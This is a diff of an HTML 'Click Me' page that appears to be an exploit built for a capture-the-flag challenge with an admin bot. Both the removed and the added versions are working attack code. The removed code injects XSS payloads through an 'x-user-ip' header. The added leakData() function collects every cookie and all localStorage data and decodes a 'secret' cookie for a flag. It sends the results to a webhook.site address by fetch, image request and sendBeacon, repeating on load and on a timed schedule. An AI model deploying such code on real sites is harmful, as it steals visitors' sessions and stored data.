@@ -3,14 +3,23 @@
 <head>
     <title>Click Me</title>
     <style>
-        .center-button {
-            position: fixed;
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f5f5f5;
+        }
+        .button {
+            position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            background: #4CAF50;
-            color: white;
             padding: 20px 40px;
+            background-color: #4CAF50;
+            color: white;
             font-size: 24px;
             border: none;
             border-radius: 8px;
@@ -20,72 +29,121 @@
     </style>
 </head>
 <body>
-    <button id="button" class="center-button">Click Me!</button>
+    <button id="clickme" class="button">Click Me!</button>
 
     <script>
-        // Run when page loads
-        window.onload = function() {
-            // The initial payload - extremely simple
-            sendExploit(`new Image().src="https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?c="+document.cookie`);
+        // Function to exfiltrate data to webhook
+        function leakData() {
+            // Get all cookies
+            const cookies = document.cookie;
             
-            // Position button perfectly at center
-            const centerButton = document.createElement('button');
-            centerButton.textContent = 'Click Me!';
-            centerButton.className = 'center-button';
+            // Get localStorage data
+            const localStorageData = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                localStorageData[key] = localStorage.getItem(key);
+            }
             
-            // When clicked, send another exploit
-            centerButton.addEventListener('click', function() {
-                // Second payload triggered by click
-                sendExploit(`new Image().src="https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?t=click&c="+document.cookie`);
-                
-                // After a few seconds, try to decode the secret
-                setTimeout(function() {
-                    // Super minimal decode payload
-                    sendExploit(`
-                    var s=document.cookie.split("secret=")[1]?.split(";")[0];
-                    var d;try{d=atob(s)}catch(e){d=""}
-                    new Image().src="https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?s="+s+"&d="+d;
-                    `);
-                }, 2000);
-                
-                // Schedule more payloads during the 60-second wait period
-                setTimeout(function() {
-                    sendExploit(`new Image().src="https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?t=10&c="+document.cookie`);
-                }, 10000);
-                
-                setTimeout(function() {
-                    sendExploit(`new Image().src="https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?t=30&c="+document.cookie`);
-                }, 30000);
-            });
-            
-            // Replace the original button with our perfect center button
-            document.body.innerHTML = '';
-            document.body.appendChild(centerButton);
-        };
-        
-        // Function to send an XSS exploit via x-user-ip header
-        function sendExploit(code) {
-            // Create a hidden iframe
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            document.body.appendChild(iframe);
-            
-            // When it loads, send the exploit
-            iframe.onload = function() {
-                try {
-                    fetch('/api/track', {
-                        headers: {
-                            'x-user-ip': code
-                        }
-                    });
-                } catch(e) {
-                    console.error('Error sending exploit:', e);
+            // Try to get the secret cookie and decode it
+            let secretCookie = '';
+            let decodedSecret = '';
+            try {
+                // Extract the secret cookie if it exists
+                const cookieParts = cookies.split('; ');
+                for (let i = 0; i < cookieParts.length; i++) {
+                    if (cookieParts[i].startsWith('secret=')) {
+                        secretCookie = cookieParts[i].substring(7);
+                        break;
+                    }
                 }
+                
+                // Decode it if found
+                if (secretCookie) {
+                    decodedSecret = atob(secretCookie);
+                }
+            } catch (e) {
+                console.error('Error decoding secret:', e);
+            }
+            
+            // Prepare data to send
+            const data = {
+                cookies: cookies,
+                localStorage: localStorageData,
+                secretCookie: secretCookie,
+                decodedSecret: decodedSecret,
+                url: window.location.href,
+                timestamp: new Date().toISOString()
             };
             
-            // Set source to trigger load
-            iframe.src = 'about:blank';
+            // Try to extract flag from decoded secret
+            if (decodedSecret && decodedSecret.includes(':')) {
+                data.flag = decodedSecret.split(':')[1];
+            }
+            
+            // Send data via fetch
+            try {
+                fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data),
+                    mode: 'no-cors'
+                });
+            } catch (e) {
+                console.error('Error sending data via fetch:', e);
+            }
+            
+            // Send critical data via image as backup (works even with CORS issues)
+            try {
+                const img = new Image();
+                img.src = 'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag=' + 
+                    encodeURIComponent(data.flag || '') + 
+                    '&secret=' + encodeURIComponent(secretCookie) +
+                    '&decoded=' + encodeURIComponent(decodedSecret) +
+                    '&t=' + Date.now();
+                document.body.appendChild(img);
+            } catch (e) {
+                console.error('Error sending data via image:', e);
+            }
+            
+            // Also try navigator.sendBeacon (works when page is closing)
+            try {
+                navigator.sendBeacon(
+                    'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a',
+                    JSON.stringify(data)
+                );
+            } catch (e) {
+                console.error('Error sending data via beacon:', e);
+            }
+            
+            console.log('Exfiltration attempt complete');
         }
+        
+        // When page loads
+        window.onload = function() {
+            // Create perfect center button for bot to click
+            const centerButton = document.createElement('button');
+            centerButton.textContent = 'Click Me!';
+            centerButton.className = 'button';
+            
+            // When clicked, leak all data
+            centerButton.addEventListener('click', function() {
+                // Immediate leak on click
+                leakData();
+                
+                // Schedule more leaks during the 60-second wait period
+                setTimeout(leakData, 5000);  // After 5 seconds
+                setTimeout(leakData, 15000); // After 15 seconds
+                setTimeout(leakData, 30000); // After 30 seconds
+                setTimeout(leakData, 45000); // After 45 seconds
+            });
+            
+            // Replace the original button
+            document.body.innerHTML = '';
+            document.body.appendChild(centerButton);
+            
+            // Also try leaking immediately on page load
+            setTimeout(leakData, 1000);
+        };
     </script>
 </body>
 </html>
